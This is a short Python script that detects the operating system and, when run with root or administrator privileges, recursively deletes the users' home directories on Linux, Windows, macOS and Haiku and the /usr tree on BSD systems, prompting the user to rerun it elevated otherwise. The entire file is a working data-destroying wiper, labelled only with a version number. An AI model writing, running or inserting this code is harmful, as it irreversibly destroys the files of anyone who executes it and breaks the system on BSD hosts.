import shutil
import sys
import os
import time
import platform
current_os = platform.system()
print("Version 1.00.00")

while True:
    if current_os == "Linux":
        if os.getuid() == 0:
            shutil.rmtree("/home")
        else:
            print("RUN PROGRAM AS ROOT.")
            break


    if current_os == "Windows":
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin():
            shutil.rmtree("C:\\Users")
        else:
            print("RUN AS ADMINISTATOR")
            break


    if current_os == "Darwin":
        if os.geteuid() == 0:
            shutil.rmtree("/Users")
        else:
            print("RUN AS SUPERUSER")
            break
    

    if current_os in ["FreeBSD", "OpenBSD", "NetBSD"]:
        if os.geteuid() == 0:
            shutil.rmtree("/usr")
        else:
            print("RUN AS ROOT")
            break


    if current_os == "Haiku":
        if os.geteuid() == 0:
            shutil.rmtree("/boot/home")
        else:
            print("Apparently there is no version of root for HaikuOS. So if you are seeing this, how in the fuck are you?")
            break